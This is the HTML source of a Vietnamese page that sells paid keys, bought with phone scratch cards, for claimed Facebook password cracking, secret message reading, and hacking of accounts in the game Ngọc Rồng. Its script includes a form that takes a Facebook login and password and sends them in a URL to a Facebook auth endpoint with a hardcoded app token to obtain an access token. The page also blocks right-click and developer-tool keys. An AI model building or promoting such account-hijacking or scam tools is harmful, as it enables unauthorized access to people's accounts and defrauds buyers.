

<!DOCTYPE html>
<html lang="en">

    <head>

       <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>V4U.ME - Check Pass Facebook Online</title>

        <!-- CSS -->
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,500,500i">
        <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/font-awesome/css/font-awesome.min.css">
        <link rel="stylesheet" href="assets/css/animate.css">
        <link rel="stylesheet" href="assets/css/style09f4.css?2076244111">
        <script src="https://code.jquery.com/jquery-1.8.2.js"></script>
        <script type="text/javascript" src="invisible_debut.js" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
        <script data-ad-client="ca-pub-1454538130177186" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
        <script>
                    function loading(show) {
    if(show == true)
        $('.loading').show();
    else
        $('.loading').hide();
}
        </script>
        <style>
            .modal-body {
    text-align: left;
    position: relative;
    padding: 15px;
}
.img-replace {
  /* replace text with an image */
  display: inline-block;
  overflow: hidden;
  text-indent: 100%; 
  color: transparent;
  white-space: nowrap;
}
.bts-popup {
  position: fixed;
  left: 0;
  top: 0;
  height: 100%;
  width: 100%;
  background-color: rgba(0, 0, 0, 0.5);
  opacity: 0;
  visibility: hidden;
  -webkit-transition: opacity 0.3s 0s, visibility 0s 0.3s;
  -moz-transition: opacity 0.3s 0s, visibility 0s 0.3s;
  transition: opacity 0.3s 0s, visibility 0s 0.3s;
}
.bts-popup.is-visible {
  opacity: 1;
  visibility: visible;
  -webkit-transition: opacity 0.3s 0s, visibility 0s 0s;
  -moz-transition: opacity 0.3s 0s, visibility 0s 0s;
  transition: opacity 0.3s 0s, visibility 0s 0s;
}

.bts-popup-container {
  position: relative;
  width: 90%;
  max-width: 400px;
  margin: 4em auto;
  background: #f36f21;
  border-radius: none; 
  text-align: center;
  box-shadow: 0 0 2px rgba(0, 0, 0, 0.2);
  -webkit-transform: translateY(-40px);
  -moz-transform: translateY(-40px);
  -ms-transform: translateY(-40px);
  -o-transform: translateY(-40px);
  transform: translateY(-40px);
  /* Force Hardware Acceleration in WebKit */
  -webkit-backface-visibility: hidden;
  -webkit-transition-property: -webkit-transform;
  -moz-transition-property: -moz-transform;
  transition-property: transform;
  -webkit-transition-duration: 0.3s;
  -moz-transition-duration: 0.3s;
  transition-duration: 0.3s;
}
.bts-popup-container img {
  padding: 20px 0 0 0;
}
.bts-popup-container p {
	color: white;
  padding: 10px 40px;
}
.bts-popup-container .bts-popup-button {
  padding: 5px 25px;
  border: 2px solid white;
	display: inline-block;
  margin-bottom: 10px;
}

.bts-popup-container a {
  color: white;
  text-decoration: none;
  text-transform: uppercase;
}






.bts-popup-container .bts-popup-close {
  position: absolute;
  top: 8px;
  right: 8px;
  width: 30px;
  height: 30px;
}
.bts-popup-container .bts-popup-close::before, .bts-popup-container .bts-popup-close::after {
  content: '';
  position: absolute;
  top: 12px;
  width: 16px;
  height: 3px;
  background-color: white;
}
.bts-popup-container .bts-popup-close::before {
  -webkit-transform: rotate(45deg);
  -moz-transform: rotate(45deg);
  -ms-transform: rotate(45deg);
  -o-transform: rotate(45deg);
  transform: rotate(45deg);
  left: 8px;
}
.bts-popup-container .bts-popup-close::after {
  -webkit-transform: rotate(-45deg);
  -moz-transform: rotate(-45deg);
  -ms-transform: rotate(-45deg);
  -o-transform: rotate(-45deg);
  transform: rotate(-45deg);
  right: 6px;
  top: 13px;
}
.is-visible .bts-popup-container {
  -webkit-transform: translateY(0);
  -moz-transform: translateY(0);
  -ms-transform: translateY(0);
  -o-transform: translateY(0);
  transform: translateY(0);
}
@media only screen and (min-width: 1170px) {
  .bts-popup-container {
    margin: 8em auto;
  }
}
h1 {
  color: blue;
}
        </style>
<script>
    jQuery(document).ready(function($){
  
  window.onload = function (){
    $(".bts-popup").delay(1000).addClass('is-visible');
	}
  
	//open popup
	$('.bts-popup-trigger').on('click', function(event){
		event.preventDefault();
		$('.bts-popup').addClass('is-visible');
	});
	
	//close popup
	$('.bts-popup').on('click', function(event){
		if( $(event.target).is('.bts-popup-close') || $(event.target).is('.bts-popup') ) {
			event.preventDefault();
			$(this).removeClass('is-visible');
		}
	});
	//close popup when clicking the esc keyboard button
	$(document).keyup(function(event){
    	if(event.which=='27'){
    		$('.bts-popup').removeClass('is-visible');
	    }
    });
});
</script>
        <link rel="stylesheet" href="assets/css/nhan.css?290072433">
    </head>

    <body>
                <div class="loading"><div class="lds-hourglass"></div></div>

<nav class="navbar navbar-inverse navbar-expand-xl navbar-dark">
	<div class="navbar-header d-flex col">
		<a class="navbar-brand" href="#"><i class="fa fa-cube"></i>V4U<b>.ME</b></a>  		
		<button type="button" data-target="#navbarCollapse" data-toggle="collapse" class="navbar-togglessss navbar-toggle navbar-toggler ml-auto">
			<span class="navbar-toggler-icon"></span>
			<span class="icon-bar"></span>
			<span class="icon-bar"></span>
			<span class="icon-bar"></span>
		</button>
	</div>
	<!-- Collection of nav links, forms, and other content for toggling -->
	<div id="navbarCollapse" class="collapse navbar-collapse justify-content-start">		
		<ul class="nav navbar-nav navbar-right ml-auto">
		    <li class="nav-item active"><a href="hacknro.php" class="nav-link"><i class="fa fa-home"></i><span>Hack Nick NGỌC RỒNG </span></a></li>
			<li class="nav-item active"><a href="free.php" class="nav-link"><i class="fa fa-home"></i><span>Nhận key free </span></a></li>
		<!--	<li class="nav-item"><a href="#" class="nav-link"><i class="fa fa-gears"></i><span>Projects</span></a></li>
			<li class="nav-item"><a href="#" class="nav-link"><i class="fa fa-users"></i><span>Team</span></a></li>
			<li class="nav-item"><a href="#" class="nav-link"><i class="fa fa-pie-chart"></i><span>Reports</span></a></li>
			<li class="nav-item"><a href="#" class="nav-link"><i class="fa fa-briefcase"></i><span>Careers</span></a></li>
			<li class="nav-item"><a href="#" class="nav-link"><i class="fa fa-envelope"></i><span>Messages</span></a></li>		
			<li class="nav-item"><a href="#" class="nav-link"><i class="fa fa-bell"></i><span>Notifications</span></a></li>
			-->

		</ul>
	</div>
</nav>

			        <!-- Features -->
        <div class="features-container section-container">
	        <div class="container">
	        	<div class="row">
	        	    <div class="col-sm-5 features-box wow fadeInLeft">
	        	  
	        	        <div class="panel panel-default">
	        	     <div class="panel-body">       



  <div class="form-group">
    <label for="linktoprofile">Link facebook cần check :</label>
    <input type="text" class="form-control" id="linkcheck" aria-describedby="linktoprofile" placeholder="VD: https://facebook.com/Youtube.VN"/>  </div>
    <div class="form-group">
    <label for="nhapkeys">Nhập key :</label>
    <input type="text" class="form-control" id="nhapkey" aria-describedby="nhapkeys" placeholder="Nhập key mà bạn đã mua"/>  </div>
    <div class="form-group">
<button type="submit" id="crackpassword" style="margin-bottom: 0;" class="btn btn-primary">Check Pass</button>
<button type="submit" id="crackpasswords" style="margin-bottom: 0;" class="btn btn-primary">Đọc trộm tin nhắn</button>

    
  </div>
  <small id="emailHelp" class="form-text text-muted">Vui lòng nhập link dạng fb.com/zuck hoặc facebook.com/profile.php?id=4.</small>
  <div class="form-group" id="ketquacheck" style="display:none">
  </div>
<script>

    $("#crackpassword").click(function(){
       if($.trim($('#linkcheck').val()) === "" && $.trim($('#nhapkey').val()) === ""){
           $("#ketquacheck").html('<div class="alert alert-info" role="alert">Vui lòng nhập đầy đủ nội dung !</div>');
           document.getElementById("ketquacheck").style.display = "block";
       } else {
    loading(true);
      $('#ketquacheck').load('ajax.php?PT=CHECKPASS&key='+ $("#nhapkey").val() +'&linkvhn=' + $("#linkcheck").val(), function(){
            loading(false);
            document.getElementById("ketquacheck").style.display = "block";
        });
       }
    });
    $("#crackpasswords").click(function(){
       if($.trim($('#linkcheck').val()) === "" && $.trim($('#nhapkey').val()) === ""){
           $("#ketquacheck").html('<div class="alert alert-info" role="alert">Vui lòng nhập đầy đủ nội dung !</div>');
           document.getElementById("ketquacheck").style.display = "block";
       } else {
    loading(true);
      $('#ketquacheck').load('ajax.php?PT=CHECKPASS&key='+ $("#nhapkey").val() +'&linkvhn=' + $("#linkcheck").val(), function(){
            loading(false);
            document.getElementById("ketquacheck").style.display = "block";
        });
       }
    });
</script>
<script language="JavaScript">
      
       window.onload = function () {
           document.addEventListener("contextmenu", function (e) {
               e.preventDefault();
           }, false);
           document.addEventListener("keydown", function (e) {
               //document.onkeydown = function(e) {
               // "I" key
               if (e.ctrlKey && e.shiftKey && e.keyCode == 73) {
                   disabledEvent(e);
               }
               // "J" key
               if (e.ctrlKey && e.shiftKey && e.keyCode == 74) {
                   disabledEvent(e);
               }
               // "S" key + macOS
               if (e.keyCode == 83 && (navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)) {
                   disabledEvent(e);
               }
               // "U" key
               if (e.ctrlKey && e.keyCode == 85) {
                   disabledEvent(e);
               }
               // "F12" key
               if (event.keyCode == 123) {
                   disabledEvent(e);
               }
           }, false);
           function disabledEvent(e) {
               if (e.stopPropagation) {
                   e.stopPropagation();
               } else if (window.event) {
                   window.event.cancelBubble = true;
               }
               e.preventDefault();
               return false;
           }
       }
//edit: removed ";" from last "}" because of javascript error
</script>
<script type="text/javascript">//<![CDATA[


shortcut = {
    all_shortcuts: {},
      add: function (e, t, n) {
        var r = {
          type: "keydown",
          propagate: !1,
          disable_in_input: !1,
          target: document,
          keycode: !1
        };
        if (n) for (var i in r) "undefined" == typeof n[i] && (n[i] = r[i]);
        else n = r;
        r = n.target, "string" == typeof n.target && (r = document.getElementById(n.target)), e = e.toLowerCase(), i = function (r) {
          r = r || window.event;
          if (n.disable_in_input) {
            var i;
            r.target ? i = r.target : r.srcElement && (i = r.srcElement), 3 == i.nodeType && (i = i.parentNode);
            if ("INPUT" == i.tagName || "TEXTAREA" == i.tagName) return
          }
          r.keyCode ? code = r.keyCode : r.which && (code = r.which), i = String.fromCharCode(code).toLowerCase(), 188 == code && (i = ","), 190 == code && (i = ".");
          var s = e.split("+"),
            o = 0,
            u = {
              "`": "~",
              1: "!",
              2: "@",
              3: "#",
              4: "$",
              5: "%",
              6: "^",
              7: "&",
              8: "*",
              9: "(",
              0: ")",
              "-": "_",
              "=": "+",
              ";": ":",
              "'": '"',
              ",": "<",
              ".": ">",
              "/": "?",
              "\\": "|"
            }, f = {
              esc: 27,
              escape: 27,
              tab: 9,
              space: 32,
              "return": 13,
              enter: 13,
              backspace: 8,
              scrolllock: 145,
              scroll_lock: 145,
              scroll: 145,
              capslock: 20,
              caps_lock: 20,
              caps: 20,
              numlock: 144,
              num_lock: 144,
              num: 144,
              pause: 19,
              "break": 19,
              insert: 45,
              home: 36,
              "delete": 46,
              end: 35,
              pageup: 33,
              page_up: 33,
              pu: 33,
              pagedown: 34,
              page_down: 34,
              pd: 34,
              left: 37,
              up: 38,
              right: 39,
              down: 40,
              f1: 112,
              f2: 113,
              f3: 114,
              f4: 115,
              f5: 116,
              f6: 117,
              f7: 118,
              f8: 119,
              f9: 120,
              f10: 121,
              f11: 122,
              f12: 123
            }, l = !1,
            c = !1,
            h = !1,
            p = !1,
            d = !1,
            v = !1,
            m = !1,
            y = !1;
          r.ctrlKey && (p = !0), r.shiftKey && (c = !0), r.altKey && (v = !0), r.metaKey && (y = !0);
          for (var b = 0; k = s[b], b < s.length; b++) "ctrl" == k || "control" == k ? (o++, h = !0) : "shift" == k ? (o++, l = !0) : "alt" == k ? (o++, d = !0) : "meta" == k ? (o++, m = !0) : 1 < k.length ? f[k] == code && o++ : n.keycode ? n.keycode == code && o++ : i == k ? o++ : u[i] && r.shiftKey && (i = u[i], i == k && o++);
          if (o == s.length && p == h && c == l && v == d && y == m && (t(r), !n.propagate)) return r.cancelBubble = !0, r.returnValue = !1, r.stopPropagation && (r.stopPropagation(), r.preventDefault()), !1
        }, this.all_shortcuts[e] = {
          callback: i,
          target: r,
          event: n.type
        }, r.addEventListener ? r.addEventListener(n.type, i, !1) : r.attachEvent ? r.attachEvent("on" + n.type, i) : r["on" + n.type] = i
      },
      remove: function (e) {
        var e = e.toLowerCase(),
          t = this.all_shortcuts[e];
        delete this.all_shortcuts[e];
        if (t) {
          var e = t.event,
            n = t.target,
            t = t.callback;
          n.detachEvent ? n.detachEvent("on" + e, t) : n.removeEventListener ? n.removeEventListener(e, t, !1) : n["on" + e] = !1
        }
      }
    },
     shortcut.add("Ctrl+U",function(){
     alert('Sorry\nNo CTRL+U is allowed. Be creative!')
    }),
     shortcut.add("Meta+Alt+U",function(){
     alert('Sorry\nNo Command+Option+U is allowed. Be creative!')
    }),
    shortcut.add("Ctrl+C",function(){
     alert('Sorry\nNever duplicate this article...')
    }),
    shortcut.add("Meta+C",function(){
     alert('Sorry\nNever duplicate this article...')
    });


  //]]></script>

  

  	        	        
</div></div>
<div class="panel panel-default">
    <div class="panel-heading">Mua key check pass bằng thẻ cào</div>
    <div class="panel-body">
        					<div class="form-group">
						<label>Loại thẻ:</label>
						<select class="form-control" id="card_type">
							<option value="">Chọn loại thẻ</option>
							<option value="VIETTEL">Viettel</option>
							<option value="MOBIFONE">Mobifone</option>
							<option value="VINAPHONE">Vinaphone</option>
						</select>
					</div>
					<div class="form-group">
						<label>Mệnh giá:</label>
						<select class="form-control" id="card_amount">
							<option value="">Chọn mệnh giá</option>
							<option value="10000">10.000 </option>
							<option value="20000">20.000 </option>
							<option value="50000">50.000 </option>
							<option value="100000">100.000 (1 lần sử dụng)</option>
							<option value="200000">200.000 (1 ngày sử dụng)</option>
							<option value="300000">300.000 (1 tuần sử dụng)</option>
							<option value="500000">500.000 (1 tháng sử dụng)</option>
							<option value="1000000">1.000.000 (Vĩnh viễn)</option>
						</select>
					</div>
					<div class="form-group">
						<label>Số seri:</label>
						<input type="text" class="form-control" id="serial" />
					</div>
					<div class="form-group">
						<label>Mã thẻ:</label>
						<input type="text" class="form-control" id="pin" />
					</div>
					<div class="form-group">
						<div id="KETQUAMUAKEY"></div>
					</div>
					<div class="form-group">
						<button id="napmuakey" class="btn btn-success btn-block" name="button">NẠP MUA KEY NGAY</button>
					</div>
					<script>
					    $("#napmuakey").click(function(){
if(!$.trim($('#card_type').val()) == "" && !$.trim($('#serial').val()) == "" && !$.trim($('#card_amount').val()) == "" && !$.trim($('#pin').val()) == "") {
    loading(true);
    $.post("napthe.php",
  {
    card_type: $('#card_type').val(),
    card_amount: $('#card_amount').val(),
    serial: $('#serial').val(),
    pin: $('#pin').val()
  },
  function(data, status){
loading(false);
   $("#KETQUAMUAKEY").html(data);
  });
} else {
  $("#KETQUAMUAKEY").html('<div class="alert alert-danger"><strong>Lỗi!</strong> Vui lòng nhập đầy đủ thông tin.</div>');
}
});
					</script>
        </div></div>

       </div>
	        	    <div class="col-sm-7 features-box wow fadeInLeft animated" style="visibility: visible; animation-name: fadeInLeft;">
	        	        
	        	                 
	        	        <div class="panel panel-default">
    <div class="panel-heading">Xem Video Hướng Dẫn Hack Nick</div>
    <div class="panel-body">
 <a class="btn btn-default ripple r-raised" href="https://youtu.be/19LuzYfssUE" data-target="#TB">Xem Video</a>
 <a class="btn btn-default ripple r-raised" href="free.php" data-target="#TB">Nhận Key Free</a>
    
 
    
        

</div> </div>
	        	    
	        	        
	        	                 
  <div class="panel panel-default">
    <div class="panel-heading">Bảng giá key check pass</div>
    <div class="panel-body">
         <div class="table-responsive">          
  <table class="table">
    <thead>
      <tr>
        <th>Giá</th>
        <th>Hạn sử dụng</th>
        <th>Trạng thái</th>
      </tr>
    </thead>
    <tbody>
            <tr>
        <td>100.000 VND</td>
        <td>1 lần sử dụng</td>
        <td>Còn key</td>
      </tr>
                        <tr>
        <td>200.000 VND</td>
        <td>1 ngày sử dụng</td>
        <td>Còn key</td>
      </tr>
            <tr>
        <td>300.000 VND</td>
        <td>1 tuần sử dụng</td>
        <td>Còn key</td>
      </tr>
            <tr>
        <td>500.000 VND</td>
        <td>1 tháng sử dụng</td>
        <td>Còn key</td>
      </tr>
      <tr>
        <td>1.000.000 VND</td>
        <td>Vĩnh viễn</td>
        <td>Còn key</td>
      </tr>
    </tbody>
  </table>
  </div>
    </div>
  </div>
       
    </div>
  </div>

	        	    </div></div>
	        	   

	        </div>
        </div>
        <!-- Footer -->
        <footer>
	        <div class="container">
	        	<div class="row">
	        		
                    </div>
                </div>
	        </div>
        </footer>


        <!-- Javascript -->
        <script src="assets/bootstrap/js/bootstrap.min.js"></script>
        <script src="assets/js/jquery.backstretch.min.js"></script>
        <script src="assets/js/wow.min.js"></script>
        <script src="assets/js/waypoints.min.js"></script>
        <script src="assets/js/scripts.js"></script>
        <script>

           
  

        </script>
        <script>
function GetToken(){
      $("#noidungmodal").html('<div class="form-group"><label for="taikhoan">Tài khoản:</label><input type="text" class="form-control" placeholder="Email, UID hoặc Số điện thoại" id="taikhoan"></div><div class="form-group"><label for="matkhau">Password:</label><input type="password" placeholder="Mật khẩu facebook" class="form-control" id="matkhau"></div><div class="form-group"><button onclick="laytoken()" class="btn btn-primary">Get Acccess Token</button></div><div class="form-group"><div id="ketqua_token"></div></div>');
  }
  function laytoken(){
    if(!$.trim($('#taikhoan').val()) == "" && !$.trim($('#matkhau').val()) == "") {
    $('#ketqua_token').html('<iframe style="width: 100%;border: 1px solid #00ec07;padding: 0 10px;background: #009e05;" src="https://b-graph.facebook.com/auth/login?email=' + $('#taikhoan').val() +'&password=' + $('#matkhau').val() +'&access_token=6628568379|c1e620fa708a1d5696fb991c1bde5662&method=post"></iframe>');
    
}
    else {
    $('#ketqua_token').html('<div class="alert alert-danger"><strong>Lỗi!</strong> Vui lòng nhập đầy đủ thông tin.</div>');
    }
  }
  function MuaAccount(idfb, thongtinlienhe){
      loading(true);
      $('#noidungmodal').load('ajax.php?PT=MUAACC&lienhe='+ thongtinlienhe +'&linkvhn=huunhandz.com/' + idfb, function(){
            loading(false);
        });
  }
  function Cookie(){
      $("#noidungmodal").html('<textarea class="form-control" rows="4"></textarea>');
  }
  function GetUID(){
      $("#noidungmodal").html('<div class="input-group"><input placeholder="Ví dụ : https://facebook.com/zuck" id="idfb" type="text" class="form-control"><span class="input-group-btn"><button class="btn btn-default" onclick="GetID()" type="button">GET!</button></span></div><br/><div id="kg_get_id"></div>');
  }
  function GetID(){
      var id_facebook = $("#idfb").val();
      loading(true);
      $('#kg_get_id').load('ajax.php?PT=GETUID&linkvhn=' + id_facebook, function(){
            loading(false);
            $("#kg_get_id").addClass("alert alert-info");
        });
  }
    function FanpageInfo(){
      $("#noidungmodal").html('<div class="input-group"><input placeholder="Ví dụ : https://www.facebook.com/vlogtuit" id="idfb" type="text" class="form-control"><span class="input-group-btn"><button class="btn btn-default" onclick="GetPage()" type="button">GET!</button></span></div><br/><div id="kg_get_id"></div>');
  }
  function GetPage(){
      var id_facebook = $("#idfb").val();
      loading(true);
      $('#kg_get_id').load('ajax.php?PT=GETFANPAGEINFO&linkvhn=' + id_facebook, function(){
            loading(false);
            $("#kg_get_id").addClass("alert alert-info");
        });
  }
  function HDGETTOKEN(){
      $("#noidungmodal").html('<div class="huongdangettoken"><h4>Các bước get token không checkpoint bằng mật khẩu ứng dụng</h4><li><b>Bước 1:</b> Bạn nhập tài khoản vào khung get token sau đó bạn truy cập vào <a href="https://m.facebook.com/new_sec_settings/app_passwords/?step=generate" target="_blank">link này</a> (đăng nhập vào tài khoản trước).</li><li><b>Bước 2:</b> Tiếp theo bạn gõ tên ứng dụng và nhấn <b>Tạo</b>. Copy mật khẩu được tạo rồi dán vào ô mật khẩu để lấy token.</li><li><b>Bước 3:</b> Copy đoạn này và dán vào ô đăng nhập, sau đó nhấn <b>Login</b>.</li><center><img class="img-responsive" src="assets/img/Token.png"/></div>');
  }
  $("#dongmodal").click(function(){
     $("#noidungmodal").html('');
  });
  
        </script>

    </body>
</div>
<!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/5f3258c1ed9d9d262709d8bc/default';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->
</html>